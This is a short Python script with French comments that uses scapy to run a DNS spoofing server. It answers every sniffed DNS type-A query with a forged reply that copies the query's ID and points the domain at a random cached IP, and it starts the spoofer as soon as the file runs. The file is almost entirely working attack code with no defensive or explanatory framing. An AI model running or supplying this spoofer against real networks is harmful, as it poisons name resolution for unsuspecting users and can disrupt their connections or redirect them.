from scapy.all import *
from pdb import set_trace # debuger python for breakpint
from pprint import pprint as pp

from scapy.compat import Any

# DNS SPOOF TOTAL 
class FakeDns_Srv(AnsweringMachine):

    def parse_options(self):
        self.cache= {}

    def is_request(self, pkt):
        if(DNSQR in pkt and IP in pkt):
            if(pkt[DNSQR].qtype == 1):
                return True
        return False


    def make_reply(self, pkt):

        query = pkt[DNSQR]
        #filter only dns request type A
       
        target_domain = query.qname

        reply_ip = self.cache.setdefault(target_domain, str(RandIP()))

        response_packet = IP(
            src=pkt[IP].dst, 
            dst=pkt[IP].src
            ) / UDP(
                dport=pkt[UDP].sport,
                sport=pkt[UDP].dport
                ) / DNS(
                    rcode="ok",
                    opcode="QUERY",
                    qr=1,
                    qd=pkt[DNSQR],
                    id=pkt[DNS].id,
                    an=DNSRR(
                        rrname=target_domain, 
                        type="A", 
                        rdata=reply_ip))

        return response_packet

# propre a scapy ()(), les premier parenthése instancie, les seconde parenthése lance la foncti on init
FakeDns_Srv()()